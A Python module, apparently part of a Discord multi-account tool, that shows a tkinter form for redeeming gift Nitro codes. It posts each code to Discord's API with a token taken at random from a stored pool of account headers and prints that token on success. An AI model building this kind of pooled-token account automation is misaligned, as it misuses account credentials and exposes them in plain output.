import tkinter
import requests
import threading
import playsound
import tkinter.filedialog
from modules import _utils

module_status = False

def start(giftcode):
    global module_status
    threading.Thread(target=playsound.playsound, args=('./resources/se/1.mp3',)).start()
    module_status = True

    cache = _utils.get_random_cache()

    request_data = {"channel_id":None,"gateway_checkout_context":None}
    response = requests.post(f'https://discord.com/api/v9/entitlements/gift-codes/{giftcode}/redeem', headers=cache['headers'], json=request_data)
    if response.status_code == 200:
        print(f'{cache["headers"]["Authorization"]}でギフトニトロを有効化しました')

def stop():
    global module_status
    module_status = False

def draw_module(module_frame):
    giftcode = tkinter.StringVar()

    tkinter.Label(master=module_frame, text='Gift Code', foreground='#ffffff', background='#2c2f33').pack()
    tkinter.Entry(master=module_frame, width=50, textvariable=giftcode).pack()
    tkinter.Button(master=module_frame, text='Redeem', width=10, foreground='#ffffff', background='#2c2f33', command=lambda:threading.Thread(target=start, args=(giftcode.get(),)).start()).pack()

module = {
    'name':'GiftNitro Redeemer',
    'description':'ギフトニトロを有効化します'
}